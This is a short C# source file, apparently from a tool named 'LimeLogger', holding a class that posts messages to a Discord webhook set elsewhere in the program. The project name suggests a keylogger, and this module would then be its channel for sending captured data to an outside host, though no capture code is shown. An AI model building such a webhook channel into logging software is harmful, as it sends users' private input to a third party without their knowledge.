using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Collections.Specialized;
using System.Threading;
using System.Globalization;
using System.IO.IsolatedStorage;
using System.Net.Http;
using static System.Net.WebRequestMethods;
using TrashWebhooks;

namespace LimeLogger
{
    public class Discord
    {
        internal static Exception lastexception;
        internal static int totalsentmessagecount = 0;

        private static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient wc = new WebClient())
            {
                try
                {
                    return wc.UploadValues(uri, pairs);
                }
                catch (WebException ex)
                {
                    // WebException'ı ele al
                    MessageBox.Show(ex.Message);
                    return null; // veya isteğin başarısız olduğunu belirtmek için başka bir değer
                }
            }
        }

        internal static byte[] SendWebHook(string msg, string username = "")
        {

            try
            {
                byte[] response = Post(Form1.universal_webhook, new NameValueCollection()
        {
            { "username", username },
            { "content", msg },
        });
                if (response != null)
                {
                    //succes


                    totalsentmessagecount++;


                    return response;

                }
                else
                {
                    return null;
                    // form.consolelog("[-]Fail " + Encoding.Default.GetString(response));
                }
            }
            catch (Exception ex )
            {
                lastexception = ex;
                return null;
            }
     
            
           
        }
    }
   
}
